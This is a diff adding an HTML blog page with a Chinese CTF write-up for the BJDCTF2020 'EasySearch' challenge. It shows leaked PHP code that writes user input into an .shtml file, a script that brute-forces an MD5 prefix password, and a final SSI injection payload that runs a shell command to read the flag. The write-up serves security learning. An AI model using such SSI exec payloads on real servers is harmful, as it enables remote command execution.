@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>&lt;BJDCTF2020&gt;EasySearch 1 - d0ud</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="d0ud">
+    <meta property="og:title" content="&lt;BJDCTF2020&gt;EasySearch 1"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://null-d0ud.github.io/img/bgg.png) }</style>
+    
+<meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
+</head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>d0ud</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <!--<form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>-->
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/SQL-injection/">SQL injection</a><a class="category-link" href="/categories/another/">another</a><a class="category-link" href="/categories/authentication/">authentication</a><a class="category-link" href="/categories/code-audit/">code audit</a><a class="category-link" href="/categories/deserialize/">deserialize</a><a class="category-link" href="/categories/file-upload/">file upload</a><a class="category-link" href="/categories/pseudo-protocol/">pseudo-protocol</a><a class="category-link" href="/categories/template-injection/">template injection</a><a class="category-link" href="/categories/xxe/">xxe</a>
+            </div>
+        </div>
+        
+            <a href="/friends">ctfers</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>&lt;BJDCTF2020&gt;EasySearch 1</h2>
+            <div class="post-meta">
+                <time class="date">2021.11.17</time>
+            
+                <span class="category"><a class="category-link" href="/categories/code-audit/">code audit</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <blockquote>这篇文章上次修改于 658 天前，可能其部分内容已经发生变化，如有疑问可询问作者。</blockquote>
+        
+            <p>扫描目录得到<code>index.php.swp</code></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">function</span> <span class="token function-definition function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-'</span><span class="token punctuation">;</span>
+		<span class="token variable">$random</span> <span class="token operator">=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//Random 5 times</span>
+		<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$random</span><span class="token punctuation">;</span>
+		<span class="token keyword">return</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+	<span class="token punctuation">&#125;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">''</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'6d0bc1'</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$admin</span> <span class="token operator">==</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[+] Welcome to manage system')&lt;/script>"</span><span class="token punctuation">;</span>
+            <span class="token variable">$file_shtml</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"public/"</span><span class="token operator">.</span><span class="token function">get_hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".shtml"</span><span class="token punctuation">;</span>
+            <span class="token variable">$shtml</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_shtml</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'
+            ***
+            ***
+            &lt;h1>Hello,'</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/h1>
+            ***
+			***'</span><span class="token punctuation">;</span>
+            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">,</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$shtml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">**</span><span class="token operator">*</span>
+			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"[!] Header  error ..."</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('[!] Failed')&lt;/script>"</span><span class="token punctuation">;</span>
+            
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token operator">**</span><span class="token operator">*</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>参数<code>password</code>用于验证，用脚本可得到<code>password</code>应为<code>2020666</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> count
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> count<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    md <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    passw <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    md<span class="token punctuation">.</span>update<span class="token punctuation">(</span>passw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    hashid <span class="token operator">=</span> md<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> hashid<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'6d0bc1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>passw<span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>username</code>用于写入文件<br>注意文件后缀为<code>shtml</code>，<code>shtml</code>文件是可以写入SSI指令的<br>成功写入后在响应头里可以得到文件路径</p>
+<p>在网站根目录下找到文件<code>flag_990c66bf85a09c664f0b6741840499b2</code><br>最终payload为</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html">username=<span class="token comment">&lt;!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--></span>&amp;password=2020666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/%5BSWPUCTF%202018%5DSimplePHP/">&lt;SWPUCTF 2018&gt;SimplePHP</a></li>
+                
+                
+                    <li>下一篇: <a href="/%5BNPUCTF2020%5DReadlezPHP/">&lt;NPUCTF2020&gt;ReadlezPHP</a></li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/wp/" rel="tag">wp</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://null-d0ud.github.io/img/logo.jpg" alt="d0ud" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>d0ud</h4>
+                <p>a ctfer</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"><CISCN2019 华东南赛区>Web11</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BNCTF2019%5DFake%20XML%20cookbook/"><NCTF2019>Fake XML cookbook</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BSUCTF%202019%5DPythonginx/"><SUCTF 2019>Pythonginx</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BBJDCTF2020%5DZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"><BJDCTF2020>ZJCTF，不过如此</a></li><li class="post-list-item"><a class="post-list-link" href="/%5BMRCTF2020%5DPYWebsite/"><MRCTF2020>PYWebsite</a></li><li class="post-list-item"><a class="post-list-link" href="/forge%20jwt/">jwt forge</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">历史：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签：</h3>
+                    <a href="/tags/basic/" style="font-size: 15px;">basic</a> <a href="/tags/script/" style="font-size: 10px;">script</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2023 <a href="/">d0ud</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":false});</script>
+
+  </body>
+</html>
